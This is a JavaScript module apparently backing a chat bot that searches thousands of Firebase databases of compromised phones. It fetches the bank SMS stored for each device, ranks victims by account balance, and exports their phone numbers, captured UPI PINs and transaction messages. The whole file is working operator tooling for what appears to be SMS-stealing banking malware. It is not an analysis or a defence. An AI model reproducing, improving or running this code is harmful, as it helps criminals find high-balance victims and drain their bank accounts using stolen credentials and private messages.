import { fetchPanelDevices, normalizeFirebaseUrl } from './panelCore.mjs';
import { processBankMessages, formatSmsWhen, devicePeakAmount } from './bankSms.mjs';

const TIERS = {
  low_high: { min: 2_000, max: 50_000, label: 'BAL 2K–50K (bada→chota)', sort: 'desc' },
  high_low: { min: 30_000, max: 9_000_000, label: 'BAL 30K–90L (bada→chota)', sort: 'desc' },
  mixed_all: { min: 0, max: 9_999_999_999, label: 'MIXED ALL AMOUNT', sort: 'desc', allAmounts: true },
  bank70k: { min: 70_000, max: 10_000_000, label: 'Bank 70K–1Cr', sort: 'desc' },
  user30_90L: { min: 30_000, max: 9_000_000, label: 'BAL 30K–90L', sort: 'desc' },
};

const SMS_LIMIT = { 1: 1200, 3: 1800, 7: 2200, 15: 2800, 30: 3200, 0: 4000 };
const PANEL_BATCH = 40;
const SMS_BATCH = 36;

export function parseSearchCommand(text) {
  const raw = text.replace(/^\/searchbank\s*/i, '').replace(/^\/search\s*/i, '').trim();
  const isBankHigh = /^\/searchbank/i.test(text);
  const parts = raw.split(/[,|]/).map(s => s.trim().toLowerCase()).filter(Boolean);

  const opts = {
    keywords: [],
    online: true,
    offline: false,
    bothStatus: false,
    pinBoth: true,
    pinOnly: false,
    noPinOnly: false,
    days: 1,
    tier: isBankHigh ? 'bank70k' : 'low_high',
    bankOnly: true,
    avlBal: false,
  };

  for (const p of parts) {
    if (p === 'online') {
      opts.online = true;
      opts.offline = false;
      opts.bothStatus = false;
    } else if (p === 'offline') {
      opts.offline = true;
      opts.online = false;
      opts.bothStatus = false;
    } else if (p === 'both') {
      opts.bothStatus = true;
      opts.online = false;
      opts.offline = false;
    } else if (/^\d+\s*d(ays?)?$/.test(p) || /^last\s*\d+/.test(p)) {
      opts.days = parseInt(p.match(/\d+/)?.[0] || '1', 10);
    } else if (p === 'high' || p === 'high-low') opts.tier = 'high_low';
    else if (p === 'low' || p === 'low-high') opts.tier = 'low_high';
    else if (p === 'mixed' || p === 'all' || p === 'mixed all') opts.tier = 'mixed_all';
    else if (p === '30k' || p === '30-90l') opts.tier = 'user30_90L';
    else if (/avl|bal/.test(p)) opts.avlBal = true;
    else if (p === 'bank' || p === 'bank online') opts.bankOnly = true;
    else opts.keywords.push(p);
  }

  return opts;
}

function devicePassesStatus(d, opts) {
  if (opts.bothStatus) return true;
  if (opts.online && !opts.offline) return d.status;
  if (opts.offline && !opts.online) return !d.status;
  return true;
}

function devicePassesPin(d, opts) {
  if (opts.pinBoth) return true;
  if (opts.pinOnly) return d.hasPin;
  if (opts.noPinOnly) return !d.hasPin;
  return true;
}

async function fetchDeviceMessages(device, limit = 800) {
  const base = normalizeFirebaseUrl(device.panelUrl);
  const params = new URLSearchParams({
    orderBy: '"$key"',
    limitToLast: String(limit),
  });
  if (device.panelKey?.trim()) params.set('auth', device.panelKey.trim());
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), 6500);
  try {
    const res = await fetch(`${base}/messages/${encodeURIComponent(device.id)}.json?${params}`, {
      signal: ctrl.signal,
      headers: { Accept: 'application/json' },
    });
    clearTimeout(timer);
    if (!res.ok) return null;
    const data = await res.json();
    if (data?.error) return null;
    return data;
  } catch {
    clearTimeout(timer);
    return null;
  }
}

function smsLimitForDays(days) {
  if (days <= 1) return SMS_LIMIT[1];
  if (days <= 3) return SMS_LIMIT[3];
  if (days <= 7) return SMS_LIMIT[7];
  if (days <= 15) return SMS_LIMIT[15];
  if (days <= 30) return SMS_LIMIT[30];
  return SMS_LIMIT[0];
}

function rowPassesTier(row, tier, opts) {
  const amt = row.peakAmount ?? devicePeakAmount(row);
  const allAmt = tier.allAmounts || opts.tier === 'mixed_all';
  if (allAmt) return true;
  if (amt > 0 && (amt < tier.min || amt > tier.max)) return false;
  if (
    amt === 0 &&
    (opts.tier === 'high_low' || opts.tier === 'user30_90L' || opts.tier === 'bank70k')
  ) {
    return false;
  }
  return true;
}

async function scanDeviceSms(d, opts, tier, limit, results) {
  try {
    const data = await fetchDeviceMessages(d, limit);
    const r = processBankMessages(data, opts.days);
    if (!r.bankSmsCount) return;
    if (opts.avlBal && !r.maxBalance && !r.bankSms.some(m => /avl\s*bal/i.test(m.text))) return;
    const row = { ...d, bankSms: r.bankSms, maxBalance: r.maxBalance, maxTxn: r.maxTxn };
    row.peakAmount = devicePeakAmount(row);
    if (!rowPassesTier(row, tier, opts)) return;
    results.push(row);
  } catch (_) {}
}

export function buildSearchHeader(opts, tier) {
  const pinPart = opts.pinBoth ? 'PIN: WITH + WITHOUT PIN' : 'PIN: FILTERED';
  const statPart = opts.bothStatus
    ? 'ONLINE + OFFLINE'
    : opts.online
      ? 'ONLINE DEVICES ONLY'
      : 'OFFLINE DEVICES ONLY';
  const dayPart = opts.days === 0 ? 'ALL TIME' : `LAST ${opts.days} DAY(S)`;
  return `SMS SEARCH RESULTS- AVL/BAL & BANK- ${statPart}- ${pinPart}- ${tier.label}- ${dayPart}`;
}

export function buildExportText(results, opts, tier, panelsTotal, dbPanelsHit, elapsedMs, panelsDone) {
  const smsTotal = results.reduce((s, r) => s + (r.bankSms?.length || 0), 0);
  const gen = new Date().toLocaleString('en-IN', { hour12: false }).replace(',', '');
  const lines = [
    buildSearchHeader(opts, tier),
    `Generated: ${gen}`,
    `Search time: ${(elapsedMs / 1000).toFixed(0)}s`,
    `Stats: Total Matches: ${smsTotal} | Devices: ${results.length} | DBs done: ${panelsDone}/${panelsTotal} (hit: ${dbPanelsHit})`,
    '',
  ];

  results.forEach((d, i) => {
    const smsList = d.bankSms || [];
    lines.push(`----------------+#[${i + 1}]-----------------`);
    lines.push(`Firebase: ${normalizeFirebaseUrl(d.panelUrl)}`);
    lines.push(`Device ID: ${d.id}`);
    lines.push(`Phone: ${d.phone || '—'}`);
    if (d.hasPin && d.pinValue) {
      lines.push(`UPI PIN: YES | PIN: ${d.pinValue}`);
    } else if (d.hasPin) {
      lines.push('UPI PIN: YES');
    } else {
      lines.push('UPI PIN: NO');
    }
    const peak = d.peakAmount || devicePeakAmount(d);
    if (peak) lines.push(`Peak Amount: Rs.${peak.toLocaleString('en-IN')}`);
    else if (d.maxBalance) lines.push(`Peak Avl Bal: Rs.${d.maxBalance.toLocaleString('en-IN')}`);
    lines.push(`Status: ${d.status ? 'Online' : 'Offline'} | SMS Count: ${smsList.length}`);
    lines.push(`Panel: ${d.panelName || '—'}`);
    lines.push('');
    smsList.forEach(m => {
      const when = formatSmsWhen(m.ts, m.time);
      lines.push('---------------------------------------------------');
      const tag =
        m.txnType && ['NEFT', 'IMPS', 'RTGS', 'UPI', 'credit', 'debit'].includes(m.txnType)
          ? m.txnType.toUpperCase()
          : m.txnType === 'credit'
            ? 'CREDIT'
            : m.txnType === 'debit'
              ? 'DEBIT'
              : 'BANK';
      lines.push(`[${m.sender}] | ${tag} | ${when}`);
      lines.push(m.text);
    });
    lines.push('');
  });
  return lines.join('\n');
}

/**
 * Stream search — har panel batch scan, memory mein saare devices ek saath nahi.
 * 16k+ Firebase complete tak chalti hai (OOM fix).
 */
export async function runSearch(panels, opts, onProgress) {
  const tier = TIERS[opts.tier] || TIERS.low_high;
  const t0 = Date.now();
  const panelsHit = new Set();
  const results = [];
  const limit = smsLimitForDays(opts.days);
  let panelsDone = 0;
  let devicesSmsDone = 0;

  for (let i = 0; i < panels.length; i += PANEL_BATCH) {
    const chunk = panels.slice(i, i + PANEL_BATCH);
    const settled = await Promise.allSettled(chunk.map(p => fetchPanelDevices(p)));
    const toScan = [];

    for (let j = 0; j < settled.length; j++) {
      panelsDone++;
      const panel = chunk[j];
      const r = settled[j];
      if (r.status === 'fulfilled' && r.value?.length) {
        panelsHit.add(panel.url.toLowerCase());
        for (const d of r.value) {
          if (devicePassesStatus(d, opts) && devicePassesPin(d, opts)) toScan.push(d);
        }
      }
    }

    onProgress?.({
      phase: 'run',
      panelsDone,
      panelsTotal: panels.length,
      devices: devicesSmsDone + toScan.length,
      matched: results.length,
    });

    for (let k = 0; k < toScan.length; k += SMS_BATCH) {
      const smsChunk = toScan.slice(k, k + SMS_BATCH);
      await Promise.all(smsChunk.map(d => scanDeviceSms(d, opts, tier, limit, results)));
      devicesSmsDone += smsChunk.length;
      if (panelsDone % 80 === 0 || k + SMS_BATCH >= toScan.length) {
        onProgress?.({
          phase: 'run',
          panelsDone,
          panelsTotal: panels.length,
          devices: devicesSmsDone,
          matched: results.length,
        });
      }
    }
  }

  const filtered = results.filter(r => (r.bankSms?.length || 0) > 0);
  filtered.sort((a, b) => {
    const aa = a.peakAmount || devicePeakAmount(a);
    const ab = b.peakAmount || devicePeakAmount(b);
    return ab - aa;
  });

  const elapsed = Date.now() - t0;
  const text = buildExportText(
    filtered,
    opts,
    tier,
    panels.length,
    panelsHit.size,
    elapsed,
    panelsDone
  );
  const sms = filtered.reduce((s, r) => s + r.bankSms.length, 0);

  return {
    results: filtered,
    text,
    stats: {
      devices: filtered.length,
      sms,
      panelsHit: panelsHit.size,
      panelsDone,
      panelsTotal: panels.length,
      scanned: devicesSmsDone,
      withBankSms: results.length,
    },
    elapsed,
    tier,
    opts,
  };
}

export function searchHelpText() {
  return (
    '🔎 *Search Commands*\n\n' +
    'Step flow (tap buttons):\n' +
    '`/search avl/bal, bank online`\n' +
    '→ Online / Offline / Both\n' +
    '→ 1 / 3 / 7 / 15 / 30 days · All time\n' +
    '→ With PIN · Without · Both\n' +
    '→ Low/High · ▶ Start\n\n' +
    'Quick (no taps): `/search avl/bal, bank online now`\n' +
    '🏦 `/searchbank`\n' +
    '/done = cancel'
  );
}